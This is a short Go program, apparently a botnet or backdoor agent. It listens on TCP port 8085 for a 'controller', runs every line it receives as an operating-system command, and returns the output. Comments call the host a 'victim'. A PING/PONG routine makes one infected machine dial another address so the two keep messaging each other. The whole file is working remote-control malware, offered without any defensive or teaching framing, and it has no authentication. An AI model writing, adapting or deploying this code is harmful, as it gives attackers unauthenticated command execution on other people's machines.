package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

const (
	connPort = ":8085"
	connType = "tcp"
)

/*
* Establishs a connection with the controller
*
* ln: a net.Listener. Typically created with net.Listen()
*
* Returns: An accepted connection to the controller
*/
func establishConnection(ln net.Listener) net.Conn {
	var conn net.Conn
	var err error
	for {
		conn, err = ln.Accept()
		if err != nil {
			continue
		}
		break
	}
	return conn
}

/*
* Waits for the controller to contact it and then process commands
*/
func main() {
	var ln net.Listener
	var err error
	for {
		ln, err = net.Listen(connType, connPort)
		if err != nil {
			fmt.Println("Error listening")
		}else {
			break
		}
	}
	for {
		conn := establishConnection(ln) // Waits for the controller to contact it
		for {
			message, _ := bufio.NewReader(conn).ReadString('\n')
			message = strings.TrimSuffix(message, "\n")
			command := strings.Fields(message)
			var out []byte
			var reply string
			if len(command) == 0{
				continue
			}
			if command[0] == "exit" {
				break // Waits back at the top of the loop waithing for the controller to connect again
			} else if command[0] == "PONG" {
				if len(command) >= 2 { //This checks to see if another IP was sent with the command
					fmt.Fprintf(conn, "Creating new connection\n")
					conn, err := net.Dial(connType, command[1]+connPort)
					if err != nil {
						break
					}
					fmt.Fprintf(conn, "PING\n") //Sends PING to the new connection. This victim and another will continuously message each other back and forth
				}
				reply = "PING"
			} else if command[0] == "PING" {
				reply = "PONG" 
			}else if len(command) == 1 {
				out, _ = exec.Command(command[0]).Output()
				reply = string(out[:])
			} else if len(command) > 1 {
				args := command[1:]
				out, _ = exec.Command(command[0], args[:]...).Output()
				reply = string(out[:])
			}
			fmt.Fprintf(conn, reply+"\n") //Sends it's output to the controller
		}
	}

}
